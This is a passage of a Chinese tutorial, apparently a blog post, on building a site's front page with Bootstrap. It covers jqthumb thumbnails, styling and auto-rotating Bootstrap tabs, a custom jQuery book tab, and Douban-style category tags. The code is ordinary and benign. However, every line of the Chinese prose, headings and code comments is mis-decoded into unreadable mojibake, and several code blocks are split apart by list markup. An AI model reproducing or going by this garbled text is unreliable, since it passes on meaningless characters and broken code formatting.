            position       : { y: &apos;50%&apos;, x: &apos;50%&apos;},//ä»å›¾ç‰‡çš„ä¸­é—´å¼€å§‹äº§ç”Ÿç¼©ç•¥å›¾
            zoom           : &apos;1&apos;,//ç¼©æ”¾æ¯”ä¾‹
            method         : &apos;auto&apos;,//æäº¤æ–¹æ³•ï¼Œç”¨äºä¸åŒçš„æµè§ˆå™¨ç¯å¢ƒï¼Œé»˜è®¤ä¸ºâ€˜autoâ€™
    });
}
&lt;/script&gt;
</code></pre><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†jqthumbï¼Œå¹¶ä¸”ä¼ å…¥äº†ç›¸å…³åˆå§‹åŒ–å‚æ•°ã€‚è°ƒç”¨äº†è¯¥å‡½æ•°åï¼Œåœ¨å›¾ç‰‡åŠ è½½çš„æ—¶å€™ï¼Œå°±ä¼šæŒ‰ç…§ä¸Šè¿°å‚æ•°äº§ç”Ÿå›¾ç‰‡çš„ç¼©ç•¥å›¾ï¼Œä»è€Œè§£å†³å›¾ç‰‡å˜å½¢é—®é¢˜ã€‚ç”±äºç¼©ç•¥å›¾æ˜¯ä»åŸå§‹å›¾ç‰‡çš„æ­£ä¸­é—´å¼€å§‹å¾€ä¸¤è¾¹å–å¾—ï¼Œæ‰€ä»¥è¯¥ç¼©ç•¥å›¾åŒ…å«äº†å›¾ç‰‡çš„ä¸»è¦å†…å®¹ã€‚</p>
<h2 id="é’ˆå¯¹BootStrap-tabçš„äºŒæ¬¡å¼€å‘"><a href="#é’ˆå¯¹BootStrap-tabçš„äºŒæ¬¡å¼€å‘" class="headerlink" title="é’ˆå¯¹BootStrap tabçš„äºŒæ¬¡å¼€å‘"></a>é’ˆå¯¹BootStrap tabçš„äºŒæ¬¡å¼€å‘</h2><p><strong>ä¸ºä»€ä¹ˆè¦è¿›è¡ŒäºŒæ¬¡å¼€å‘</strong></p>
<p>åœ¨æ–‡ç« åˆ—è¡¨éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†BootStrapçš„Tabæ’ä»¶ã€‚BootStrapä¸­çš„tabæ§ä»¶æ˜¯åœ¨ä¸€å°å—åŒºåŸŸå±•ç¤ºå¤§é‡ä¿¡æ¯çš„é¦–é€‰ã€‚ä½†æ˜¯ï¼Œå®ƒçš„æ ·å¼æ¯”è¾ƒå•ä¸€ã€‚è€Œåœ¨å±•ç¤ºæ–‡ç« åˆ—è¡¨æ¨¡å—æ—¶ï¼Œæˆ‘å¸Œæœ›å®ƒå¯ä»¥æ›´ç¾è§‚ï¼Œè€Œä¸”é€‰é¡¹å¡å¯ä»¥è‡ªåŠ¨åˆ‡æ¢ã€‚</p>
<p><strong>ä½¿ç”¨Tabæ’ä»¶</strong></p>
<p>åœ¨é¡µé¢ä¸­ä½¿ç”¨BootStrapçš„Tabæ’ä»¶çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<p><strong>1.åœ¨DIVåŠ å…¥role=â€tabpanelâ€</strong></p>
<p>åŠ å…¥è¯¥å±æ€§å€¼åï¼Œè¯¥DIVåˆ™å˜æˆäº†tabæ’ä»¶ã€‚</p>
<pre><code>&lt;div class=&quot;tab&quot; role=&quot;tabpanel&quot;&gt;
&lt;/div&gt;
</code></pre><p><strong>2.ä½¿ç”¨åˆ—è¡¨åˆ¶ä½œåˆ‡æ¢æ ‡ç­¾</strong></p>
<p>åˆ—è¡¨é¡¹å³ä¸ºåˆ‡æ¢æ ‡ç­¾é¡¹ã€‚</p>
<pre><code>&lt;ul class=&quot;nav nav-tabs&quot; role=&quot;tablist&quot; style=&quot;margin-top:0px;&quot; id=&quot;docTabs&quot;&gt;
&lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt;&lt;a href=&quot;#Section_new&quot;
aria-controls=&quot;home&quot; role=&quot;tab&quot; data-toggle=&quot;tab&quot;&gt; æœ€æ–°&lt;/a&gt;&lt;/li&gt;
&lt;!--å…¶ä½™æ ‡ç­¾å¡â€¦â€¦--&gt;
&lt;/ul&gt;
</code></pre><p>ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œåœ¨è¶…çº§é“¾æ¥å…ƒç´ ï¼ˆaï¼‰ä¸­æœ‰æŒ‡å‘è¯¥æ ‡ç­¾é¡µå†…å®¹çš„é“¾æ¥åœ°å€ï¼Œå¦‚â€œæœ€æ–°â€æ ‡ç­¾ä¸­ï¼Œ<code>href=&quot;#Section_new&quot;</code>,è€Œè¿™ä¸ªåœ°å€ä¸€å®šè¦è·Ÿåé¢çš„æ ‡ç­¾å†…å®¹é¡µï¼ˆtab-paneï¼‰çš„IDä¸€ä¸€å¯¹åº”ã€‚</p>
<p><strong>3.æ ‡ç­¾å†…å®¹é¡µåŒºåŸŸï¼ˆtab-contentï¼‰</strong></p>
<p>æ‰€æœ‰çš„æ ‡ç­¾å†…å®¹é¡µå‡æ”¾åœ¨è¿™ä¸ªåŒºåŸŸã€‚</p>
<pre><code>&lt;div class=&quot;tab-content&quot;&gt;
    &lt;!--æœ€æ–°--&gt;
    &lt;!--7å¤©çƒ­é—¨--&gt;
    &lt;!--30å¤©çƒ­é—¨--&gt;
&lt;/div&gt;
</code></pre><p><strong>4.å•ä¸ªæ ‡ç­¾é¡µï¼ˆtab-paneï¼‰</strong></p>
<p>tabæ’ä»¶çš„æœ€å°å…ƒç´ ï¼Œå…·ä½“çš„æ ‡ç­¾å†…å®¹é¡µã€‚</p>
<pre><code>&lt;div role=&quot;tabpanel&quot; class=&quot;tab-pane fade in active&quot; id=&quot;Section_new&quot;&gt;
    &lt;P&gt;
        tabä¸­çš„å†…å®¹
    &lt;/P&gt;
&lt;/div&gt;
&lt;!--å…¶ä½™æ ‡ç­¾é¡µâ€¦â€¦--&gt;
</code></pre><h2 id="tabæ ·å¼ç¾åŒ–"><a href="#tabæ ·å¼ç¾åŒ–" class="headerlink" title="tabæ ·å¼ç¾åŒ–"></a>tabæ ·å¼ç¾åŒ–</h2><p>ä¸‹é¢æˆ‘ä»¬æ¥ç¾åŒ–ä¸€ä¸‹tabçš„æ ·å¼å§ï¼Œé€šè¿‡CSSä»£ç æ¥è®¾ç½®tabæ’ä»¶çš„æ ·å¼ï¼Œè¿™äº›æ ·å¼ä¼šè¦†ç›–æ‰bootstrapä¸­çš„åŸæœ‰æ ·å¼è¾¾åˆ°ç¾åŒ–tabçš„æ•ˆæœï¼Œä¸»è¦åŒ…æ‹¬:</p>
<ol>
<li>æ ‡ç­¾çš„å½¢çŠ¶å’ŒèƒŒæ™¯è‰²</li>
<li>å½“å‰(è¢«é€‰ä¸­)æ ‡ç­¾çš„æ ·å¼å’ŒèƒŒæ™¯è‰²</li>
<li>æ ‡ç­¾å†…å®¹é¡µæ ·å¼</li>
<li><p>ä¸å°å±å¹•å…¼å®¹</p>
<p> //æ ‡ç­¾æ ·å¼<br> .tab .nav-tabs {<br> â€¦â€¦//è¯¦è§å³ä¾§ä»£ç <br> }<br> //æ ‡ç­¾é“¾æ¥æ ·å¼<br> .tab .nav-tabs li a {<br> background: transparent;<br> â€¦â€¦//è¯¦è§å³ä¾§ä»£ç <br> }<br> //å½“å‰é€‰ä¸­æ ‡ç­¾æ ·å¼<br> .tab .nav-tabs li.active a, .tab .nav-tabs li.active a i {<br> â€¦â€¦//è¯¦è§å³ä¾§ä»£ç <br> }<br> //å½“å‰é€‰ä¸­æ ‡ç­¾ä¹‹åæ’å…¥çš„æ ·å¼<br> .tab .nav-tabs li.active a:after {<br> â€¦â€¦//è¯¦è§å³ä¾§ä»£ç <br> }<br> //æ ‡ç­¾å†…å®¹é¡µæ ·å¼<br> .tab .tab-content {<br> â€¦â€¦//è¯¦è§å³ä¾§CSSä»£ç <br> }<br> //åœ¨å°å±å¹•ä¸­çš„æ ·å¼<br> @media only screen and (max-width: 480px) {<br> â€¦â€¦//è¯¦è§å³ä¾§ä»£ç <br> }</p>
</li>
</ol>
<h2 id="tabsè‡ªåŠ¨åˆ‡æ¢åŠŸèƒ½çš„å®ç°"><a href="#tabsè‡ªåŠ¨åˆ‡æ¢åŠŸèƒ½çš„å®ç°" class="headerlink" title="tabsè‡ªåŠ¨åˆ‡æ¢åŠŸèƒ½çš„å®ç°"></a>tabsè‡ªåŠ¨åˆ‡æ¢åŠŸèƒ½çš„å®ç°</h2><p>æ–‡ç« åˆ—è¡¨ä¸­åˆ—å‡ºçš„æœ€æ–°ã€7å¤©çƒ­é—¨ã€30å¤©çƒ­é—¨è¿™ä¸‰ä¸ªé€‰é¡¹å¡æ¯éš”5ç§’é’Ÿè‡ªåŠ¨åˆ‡æ¢ï¼Œå½“é¼ æ ‡æ‚¬åœåˆ°æŸé€‰é¡¹å¡çš„æ—¶å€™ï¼Œåˆ™æš‚åœè½®æ¢ï¼Œç§»å¼€åï¼Œç»§ç»­åˆ‡æ¢ã€‚ä»£ç è®¾è®¡æ€è·¯å¦‚ä¸‹ï¼š</p>
<ol>
<li>è®¾ç½®ä¸€ä¸ªå®šæ—¶å™¨timer()ï¼Œæ¯éš”5ç§’é’Ÿå¯¹æ ‡ç­¾é¡µè¿›è¡Œåˆ‡æ¢ä¸€æ¬¡ã€‚</li>
<li>åœ¨ç½‘é¡µåŠ è½½å®Œä»¥åå°±è¿è¡Œè¯¥å®šæ—¶å™¨ã€‚</li>
<li>å½“ç”¨æˆ·é¼ æ ‡æ‚¬åœåˆ°æŸä¸ªæ ‡ç­¾é¡µä¸Šæ—¶ï¼Œæ¸…é™¤è¯¥ï¼ˆclearIntervalï¼‰å®šæ—¶å™¨ã€‚</li>
<li><p>é¼ æ ‡ç§»å¼€åï¼Œç»§ç»­ä½¿ç”¨å®šæ—¶å™¨ã€‚</p>
<p> //tabsè‡ªåŠ¨è½®æ¢<br> function timer(i)<br> {</p>
<pre><code>interval=setInterval(function()
</code></pre><p> {</p>
<pre><code> $(&quot;#docTabs li:eq(&quot;+i+&quot;) a&quot;).tab(&apos;show&apos;);
 i++;
 if(i&gt;2)
 i=0;
}
</code></pre><p> ,5000);<br> return interval;<br> }<br> $(function(){<br> var i=0;<br> interval=timer(i);<br> //å½“é¼ æ ‡æ‚¬åœåœ¨åˆ—è¡¨åŒºåŸŸæ—¶æš‚åœè½®æ¢<br> $(â€œ.tab-paneâ€).mouseover(function(){</p>
<pre><code>    clearInterval(interval);
});
</code></pre><p> //é¼ æ ‡ç§»å¼€æ—¶ç»§ç»­è½®æ¢<br> $(â€œ.tab-paneâ€).mouseout(function(){</p>
<pre><code>   timer(i);
});
</code></pre><p> });</p>
</li>
</ol>
<h2 id="åˆ†ç±»å±•ç¤º"><a href="#åˆ†ç±»å±•ç¤º" class="headerlink" title="åˆ†ç±»å±•ç¤º"></a>åˆ†ç±»å±•ç¤º</h2><p><strong>å®ç°è¿‡ç¨‹</strong></p>
<p>æ–‡ç« åˆ†ç±»å±•ç¤ºéƒ¨åˆ†é‡‡ç”¨äº†BootStrapåŸç”Ÿçš„ä¿¡æ¯æŒ‰é’®ï¼ˆbtn-infoï¼‰,å½“é¼ æ ‡æ‚¬åœæ—¶å˜è‰²ï¼Œç‚¹å‡»åˆ™è½¬å‘ç›¸åº”çš„äºŒçº§é¡µé¢ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;div class=&quot;col-md-4&quot; style=&quot;float:right;&quot;&gt;
&lt;div&gt; 
    &lt;H5&gt;åˆ† ç±»&lt;/H5&gt;
    &lt;div style=&quot;font-size:14px;&quot; id=&quot;blogclas&quot;&gt;
        &lt;a style=&quot;margin-left:5px; margin-bottom:5px;&quot; class=&quot;btn btn-info col-md-3&quot; href=&quot;äºŒçº§é¡µé¢åœ°å€&quot; role=&quot;button&quot;&gt;åˆ†ç±»å&lt;/a&gt;
           &lt;!--å…¶ä»–åˆ†ç±»ä¿¡æ¯--&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt; 
</code></pre><p><strong>ä»£ç åˆ†æ</strong></p>
<p>ç”±ä»£ç å¯çŸ¥ï¼Œåˆ†ç±»åŒºåŸŸå æœ‰çš„å®½åº¦ä¸ºï¼ˆ4/12ï¼‰col-md-4ï¼Œè€Œå…¶ä¸­çš„å•ä¸ªåˆ†ç±»åˆå æœ‰å…¶ä¸­çš„ï¼ˆ3/12ï¼‰ col-md-3ï¼Œä¹Ÿå°±æ˜¯æ¯4ä¸ªåˆ†ç±»å ä¸€è¡Œï¼ˆå®é™…ä¸Šç”±äºåˆ†ç±»ä¹‹é—´è¦æœ‰é—´éš”ï¼Œåªèƒ½æ˜¯3ä¸ªåˆ†ç±»å ä¸€è¡Œï¼‰ã€‚</p>
<h1 id="å›¾ä¹¦æ¿å—çš„è®¾è®¡ä¸å®ç°"><a href="#å›¾ä¹¦æ¿å—çš„è®¾è®¡ä¸å®ç°" class="headerlink" title="å›¾ä¹¦æ¿å—çš„è®¾è®¡ä¸å®ç°"></a>å›¾ä¹¦æ¿å—çš„è®¾è®¡ä¸å®ç°</h1><h2 id="å¸ƒå±€-1"><a href="#å¸ƒå±€-1" class="headerlink" title="å¸ƒå±€"></a>å¸ƒå±€</h2><p>å›¾ä¹¦æ¿å—çš„å¸ƒå±€æ—¢è¦è€ƒè™‘åˆ°åˆ†ç±»å±•ç¤ºå›¾ä¹¦ä¿¡æ¯ï¼Œè¿˜éœ€è¦è€ƒè™‘ä¸å‰é¢æ–‡ç« æ¿å—çš„å¯¹åº”ï¼Œæ‰€ä»¥ï¼Œå›¾ä¹¦æ¿å—ä¹Ÿåˆ†ä¸ºå·¦å³ä¸¤éƒ¨åˆ†ï¼Œå·¦è¾¹åŒæ ·ä½¿ç”¨col-md-8,å³è¾¹ä½¿ç”¨col-md-4æ¥åˆ’åˆ†å®½åº¦ã€‚å½“ç„¶ï¼Œå¦‚æœåœ¨å…¶å®ƒå±å¹•æœ‰ä¸åŒçš„å¸ƒå±€éœ€æ±‚ï¼Œä½ ä¹Ÿå¯ä»¥æ·»åŠ ä¸Šå…¶ä»–çš„å±æ€§å€¼ï¼Œå¦‚col-xs-6ï¼ˆåœ¨æ‰‹æœºå±å¹•ä¸­å 6/12ï¼‰ç­‰ã€‚å¸ƒå±€ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;div class=&quot;col-md-8&quot; id=&quot;indexbooks&quot;&gt;
é¦–é¡µå›¾ä¹¦å±•ç¤ºåŒºâ€¦â€¦
&lt;/div&gt;
&lt;div class=&quot;col-md-4&quot;&gt;
å›¾ä¹¦åˆ†ç±»å±•ç¤ºåŒºâ€¦â€¦
&lt;/div&gt;
</code></pre><h2 id="å¼€å‘Jquery-tab"><a href="#å¼€å‘Jquery-tab" class="headerlink" title="å¼€å‘Jquery tab"></a>å¼€å‘Jquery tab</h2><p><strong>ä¸ºä»€ä¹ˆè¦è‡ªå·±å†™tab</strong></p>
<p>ä¸ºäº†æ›´å¥½çš„åœ¨é¦–é¡µå›¾æ–‡å¹¶èŒ‚çš„å±•ç¤ºå›¾ä¹¦ä¿¡æ¯ä»¥åŠæŒ‰ç±»åˆ«å±•ç¤ºå°½å¯èƒ½å¤šçš„å›¾ä¹¦ï¼Œæˆ‘å†³å®šä½¿ç”¨Jqueryå¼€å‘è‡ªå·±çš„tabã€‚ä¸‹é¢æ¥çœ‹çœ‹æˆ‘çš„å®ç°è¿‡ç¨‹ã€‚</p>
<p><strong>HTMLéƒ¨åˆ†</strong></p>
<p><strong>1.æ ‡ç­¾é¡¹</strong></p>
<p>æ ‡ç­¾ä»ç„¶ä½¿ç”¨åˆ—è¡¨æ¥å®Œæˆï¼Œåˆ—è¡¨é¡¹å³ä¸ºæ ‡ç­¾é¡¹ã€‚</p>
<pre><code>&lt;ul id=&quot;booksfilter&quot; style=&quot;float:right;font-size:14px;&quot;&gt; 
    &lt;li&gt;&lt;a class=&quot;cur&quot; href=&quot;javascript:void(0);&quot;&gt;å…¥é—¨&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot;&gt;å®æˆ˜&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot;&gt;è¿›é˜¶&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre><p>å…¶ä¸­â€™aâ€™æ ‡ç­¾çš„class=â€curâ€è¡¨ç¤ºå½“å‰è¢«é€‰ä¸­çš„æ ‡ç­¾ã€‚åé¢å†CSSä¸­ä¼šè®¾ç½®å®ƒçš„æ ·å¼ã€‚</p>
<p><strong>2.æ ‡ç­¾é¡µå†…å®¹åŒº</strong></p>
<p>ä½¿ç”¨3ä¸ªDIV,åˆ†åˆ«å­˜æ”¾å…¥é—¨ã€å®æˆ˜å’Œè¿›é˜¶çš„å›¾ä¹¦ã€‚</p>
<pre><code>&lt;div class=&quot;booklist&quot;&gt;
    å…¥é—¨çº§å›¾ä¹¦â€¦â€¦
&lt;/div&gt;
&lt;div class=&quot;booklist&quot; style=&quot;display:none;&quot;&gt;
    å®æˆ˜ç±»å›¾ä¹¦â€¦â€¦
&lt;/div&gt;
&lt;div class=&quot;booklist&quot; style=&quot;display:none;&quot;&gt;
    è¿›é˜¶ç±»å›¾ä¹¦â€¦â€¦
&lt;/div&gt;
</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œåˆå§‹æ—¶ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ ‡ç­¾é¡µçš„å†…å®¹æ˜¯æ˜¾ç¤ºçš„ï¼Œè€Œå…¶å®ƒä¸¤ä¸ªæ ‡ç­¾é¡µå†…å®¹æ˜¯éšè—ï¼ˆ<code>style=&quot;display:none;&quot;</code>ï¼‰çš„,åé¢ä¼šåˆ©ç”¨Jqueryæ¥æ§åˆ¶ä»–ä»¬çš„åˆ‡æ¢ã€‚</p>
<p><strong>3.ä½¿ç”¨ç¼©ç•¥å›¾ï¼ˆthumbnailï¼‰ç»„ä»¶å±•ç¤ºå›¾ä¹¦ä¿¡æ¯</strong></p>
<p>åœ¨è¯¥ç»„ä»¶ä¸­åŒ…å«äº†å›¾ä¹¦å°é¢ã€å›¾ä¹¦æ ‡é¢˜ã€å’Œé“¾æ¥åˆ°è¯¥å›¾ä¹¦é¡µé¢çš„è¶…çº§é“¾æ¥ã€‚</p>
<pre><code>&lt;div class=&quot;thumbnail&quot; style=&quot;height:220px; border-width:0px;&quot;&gt;
  &lt;a href=&quot;/book/577e11aa2f33c&quot; target=&quot;_blank&quot;&gt;
                &lt;img style=&quot;height:130px;&quot; src=&quot;http://img3.doubanio.com/mpic/s1039608.jpg&quot;&gt;            
  &lt;/a&gt;
  &lt;div class=&quot;caption&quot;&gt;
    &lt;h5 style=&quot;text-align:center;&quot;&gt;
    &lt;a href=&quot;/book/577e11aa2f33c&quot; target=&quot;_blank&quot;&gt;
    LINUXæƒå¨æŒ‡å—ï¼ˆ...        &lt;/a&gt;&lt;/h5&gt;
     &lt;p style=&quot;text-align:center;&quot;&gt;
    è¯„è®º(0) &lt;span class=&quot;badge&quot;&gt;1æ¨è&lt;/span&gt;&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;
</code></pre><p>å¦å¤–ï¼Œæ¯æœ¬å›¾ä¹¦æ‰€å çš„å®½åº¦ä¸ºcol-md-3,ä¹Ÿå°±æ˜¯æ¯4æœ¬ä¹¦å æ®ä¸€è¡Œã€‚</p>
<h2 id="è®¾è®¡Tabçš„æ ·å¼"><a href="#è®¾è®¡Tabçš„æ ·å¼" class="headerlink" title="è®¾è®¡Tabçš„æ ·å¼"></a>è®¾è®¡Tabçš„æ ·å¼</h2><p>ä¸‹é¢æˆ‘ä»¬æ¥è®¾è®¡ä»–çš„CSSæ ·å¼ï¼Œè®©æˆ‘ä»¬çš„tabså°½é‡ç¾è§‚ã€‚è¿™äº›æ ·å¼ä¸»è¦åŒ…æ‹¬ï¼š</p>
<ol>
<li>æ ‡ç­¾é¡¹æ ·å¼</li>
<li>æ ‡ç­¾é¡¹ä¸­é“¾æ¥çš„æ ·å¼</li>
<li><p>å½“å‰è¢«é€‰ä¸­æ ‡ç­¾çš„æ ·å¼ï¼ˆcurï¼‰</p>
<p> //é€‰é¡¹å¡åˆ—è¡¨æ ·å¼<br> #booksfilter li<br> {</p>
<pre><code>padding:5px;//å†…è¾¹è· 5px
list-style-type:none;
float:left;
padding:0px;
</code></pre><p> }<br> //è®¾ç½®â€˜|â€™çš„å·¦å³è¾¹è·<br> #booksfilter span<br> {</p>
<pre><code>margin-left:5px;
margin-right:5px;
</code></pre><p> }</p>
<p> //é€‰é¡¹å¡é“¾æ¥çš„æ ·å¼<br> #booksfilter a<br> {</p>
<pre><code>padding:5px;//å†…è¾¹è·ï¼š5px
text-decoration:none;//æ— ä¸‹åˆ’çº¿
</code></pre><p> }<br> //é€‰é¡¹å¡è¢«é€‰ä¸­æˆ–å½“é¼ æ ‡ç§»åŠ¨åˆ°é€‰é¡¹å¡æ—¶çš„æ ·å¼<br> #booksfilter a.cur,#booksfilter a:hover<br> {</p>
<pre><code>background-color:#e67e22;//èƒŒæ™¯è‰²
color:white;//å‰æ™¯è‰²
border-radius:5px;//åœ†è§’
</code></pre><p> }</p>
</li>
</ol>
<p>ä»£ç æ³¨é‡Šå·²ç»å¾ˆè¯¦ç»†äº†ï¼Œå½“ç„¶å¤§å®¶ä¹Ÿå¯ä»¥ä¿®æ”¹å®ƒæ¥è®¾è®¡å‡ºæ›´ç¾çš„æ ·å¼ã€‚</p>
<h2 id="å®ç°Tabçš„è¡Œä¸º"><a href="#å®ç°Tabçš„è¡Œä¸º" class="headerlink" title="å®ç°Tabçš„è¡Œä¸º"></a>å®ç°Tabçš„è¡Œä¸º</h2><p>å½“æ ‡ç­¾é¡¹ç‚¹å‡»åˆ‡æ¢çš„æ—¶å€™ï¼Œè¿™éƒ¨åˆ†çš„äº¤äº’å°±è¦äº¤ç»™Jqueryä»£ç æ¥å®Œæˆäº†ã€‚ ä»£ç è®¾è®¡æ€è·¯å¦‚ä¸‹ï¼š</p>
<p><strong>éå†æ‰€æœ‰çš„æ ‡ç­¾é¡µï¼Œä¸ºæ¯ä¸ªæ ‡ç­¾é¡µæ·»åŠ ç‚¹å‡»(click)äº‹ä»¶çš„å¤„ç†å‡½æ•°</strong></p>
<p>åœ¨è¯¥å¤„ç†å‡½æ•°ï¼Œé«˜äº®ï¼ˆä½¿ç”¨Jqueryåœ¨è¯¥æ ‡ç­¾é¡¹çš„classä¸­æ·»åŠ curï¼‰æ˜¾ç¤ºå½“å‰æ ‡ç­¾é¡¹å’Œå…¶å¯¹åº”çš„æ ‡ç­¾é¡µï¼Œéšè—å…¶å®ƒã€‚</p>
<pre><code>$(function()
        {
    $(&apos;#booksfilter a&apos;).each(function(i)
    {//å¯¹æ¯ä¸ªtabsä¸­çš„æ ‡ç­¾æ·»åŠ ç‚¹å‡»ï¼ˆclickï¼‰äº‹ä»¶çš„å¤„ç†å‡½æ•°

        $(this).click(function(){
            $(this).addClass(&apos;cur&apos;);
            $(this).parent().siblings().find(&apos;a&apos;).removeClass(&apos;cur&apos;);//åˆ é™¤å…¶ä»–ä»»ä½•é€‰é¡¹çš„curç±»
            $(&apos;.booklist&apos;).eq(i).show();//æ˜¾ç¤ºæœ¬èŠ‚ç‚¹
            $(&apos;.booklist&apos;).eq(i).siblings().hide();//éšè—å…„å¼ŸèŠ‚ç‚¹
        })

    });

        });
</code></pre><p>åœ¨å³ä¾§å…·ä½“ä»£ç ä¸­ï¼Œä¸ºäº†é€‚åº”å±å¹•å¤§å°ï¼Œå°†col-md-3æ”¹ä¸ºäº†col-xs-3,å¦‚æœä½ æƒ³ä½¿ç”¨è¿™ä¸ªæ’ä»¶çš„è¯åœ¨ä½ çš„é¡¹ç›®ä¸­è®°å¾—æ”¹å›å»:)ã€‚å¦å¤–ï¼Œjsä»£ç ç›´æ¥æ”¾åœ¨äº†HTMLçš„å°¾éƒ¨ã€‚</p>
<h2 id="ä»¿è±†ç“£åˆ†ç±»æ ‡ç­¾çš„å®ç°"><a href="#ä»¿è±†ç“£åˆ†ç±»æ ‡ç­¾çš„å®ç°" class="headerlink" title="ä»¿è±†ç“£åˆ†ç±»æ ‡ç­¾çš„å®ç°"></a>ä»¿è±†ç“£åˆ†ç±»æ ‡ç­¾çš„å®ç°</h2><p>ä¸ºäº†å’Œæ–‡ç« åˆ†ç±»éƒ¨åˆ†çš„æ ·å¼è¿›è¡ŒåŒºåˆ†ï¼Œæˆ‘å†³å®šè‡ªå·±åŠ¨æ‰‹å†™ä¸€ä¸ªå…·æœ‰å…¶ä»–æ ·å¼çš„åˆ†ç±»æ ‡ç­¾é›†ã€‚åˆšå¥½çœ‹åˆ°è±†ç“£è¯»ä¹¦æ¿å—çš„é¦–é¡µä¸­çš„å›¾ä¹¦åˆ†ç±»æ ‡ç­¾è¿˜ä¸é”™ï¼Œäºæ˜¯å†³å®šè‡ªå·±å†™ä¸€ä¸ªç±»ä¼¼çš„æ ·å¼ã€‚é¦–å…ˆæ˜¯HTMLä»£ç éƒ¨åˆ†ï¼š</p>
<pre><code>&lt;div class=&quot;col-md-4&quot;&gt;
&lt;h5 style=&quot;margin-top:0px;&quot;&gt;
     å›¾ä¹¦åˆ†ç±»
&lt;/h5&gt;
&lt;div class=&quot;row&quot; id=&quot;bookclass&quot;&gt;
    &lt;a href=&quot;å›¾ä¹¦åˆ†ç±»é¡µé¢&quot; class=&quot;col-md-3&quot;&gt;åˆ†ç±»å&lt;/a&gt;
    &lt;!--å…¶ä»–åˆ†ç±»--&gt;
&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>å¯ä»¥çœ‹åˆ°å›¾ä¹¦åˆ†ç±»æ ‡ç­¾å¾ˆç®€å•â€”â€”ç›´æ¥ä½¿ç”¨â€™aâ€™æ ‡ç­¾ä½œä¸ºåˆ†ç±»æ ‡ç­¾ï¼Œä¸‹é¢åªè¦é’ˆå¯¹å®ƒå†™CSSæ ·å¼å°±å¯ä»¥äº†ã€‚</p>
<pre><code>//aæ ‡ç­¾æ ·å¼
#bookclass a
{
    display:block;//åŒºå—æ˜¾ç¤º
    background-color:#f5f5f5;//èƒŒæ™¯è‰²ï¼ˆè·Ÿè±†ç“£ç›¸åŒï¼‰
    text-align:center;//æ–‡å­—å±…ä¸­
    padding:2px 5px;//å†…è¾¹è·ï¼Œä¸Šä¸‹2pxï¼Œå·¦å³5px
    float:left;//å·¦æµ®åŠ¨ï¼Œä»è€Œå¯ä»¥å®ç°æ°´å¹³æ’åˆ—
    margin:2px 2px;//å¤–è¾¹è·ï¼Œä¸Šä¸‹2px,å·¦å³2px
}
//å½“é¼ æ ‡æ‚¬åœæ—¶æ”¹å˜èƒŒæ™¯è‰²
#bookclass a:hover
{
    background-color:#e8e8e8;//åŒè±†ç“£é¢œè‰²
}
</code></pre><h1 id="ç”¨æˆ·æ¿å—çš„è®¾è®¡ä¸å®ç°"><a href="#ç”¨æˆ·æ¿å—çš„è®¾è®¡ä¸å®ç°" class="headerlink" title="ç”¨æˆ·æ¿å—çš„è®¾è®¡ä¸å®ç°"></a>ç”¨æˆ·æ¿å—çš„è®¾è®¡ä¸å®ç°</h1><h2 id="å¸ƒå±€-2"><a href="#å¸ƒå±€-2" class="headerlink" title="å¸ƒå±€"></a>å¸ƒå±€</h2><p>ç”±äºé¡¹ç›®å¼€å‘æ—¶é—´ä»“ä¿ƒï¼Œç”¨æˆ·æ¿å—æ²¡æœ‰åŠ å…¥ç‰¹åˆ«çš„æ ·å¼ç¾åŒ–å’Œè¡Œä¸ºï¼Œè€Œæ˜¯ä½¿ç”¨äº†åŸç”Ÿtabã€‚åœ¨ç”¨æˆ·æ¿å—ä¸­ï¼Œä¸»è¦å±•ç¤ºæœ€æ–°åŠ å…¥çš„ç”¨æˆ·å’Œä¸ºåšå®¢ç¤¾åŒºåšå‡ºæœ€å¤šè´¡çŒ®çš„ç”¨æˆ·ï¼ˆé«˜åˆ†ç”¨æˆ·ï¼‰ã€‚å¸ƒå±€æ¯”è¾ƒç®€å•ï¼Œé‡‡ç”¨æ•´å—å¸ƒå±€ï¼Œåˆ©ç”¨å®ƒæ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ã€‚å¸ƒå±€ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;div class=&quot;panel panel-default&quot;&gt;
&lt;!--ç”¨æˆ·å±•ç¤ºåŒº--&gt;
&lt;/div&gt;
</code></pre><h2 id="ç”¨æˆ·æ¿å—çš„å®ç°"><a href="#ç”¨æˆ·æ¿å—çš„å®ç°" class="headerlink" title="ç”¨æˆ·æ¿å—çš„å®ç°"></a>ç”¨æˆ·æ¿å—çš„å®ç°</h2><p><strong>ç”¨åˆ°çš„BootStrapå…ƒç´ </strong></p>
<p>åœ¨ç”¨æˆ·æ¿å—ä¸»è¦ç”¨åˆ°çš„BootStrapå…ƒç´ å¦‚ä¸‹ï¼š</p>
<ol>
<li>Bootstrap tabâ€”â€”ä»¥æ ‡ç­¾é¡µçš„æ–¹å¼å±•ç¤ºæ–°ä¼šå‘˜å’Œé«˜åˆ†ä¼šå‘˜</li>
<li>åœ†å½¢å›¾ç‰‡åŒºï¼ˆimg-circleï¼‰â€”â€”ç”¨äºå±•ç¤ºç”¨æˆ·çš„å¤´åƒã€‚</li>
</ol>
<p><strong>å®ç°è¿‡ç¨‹</strong></p>
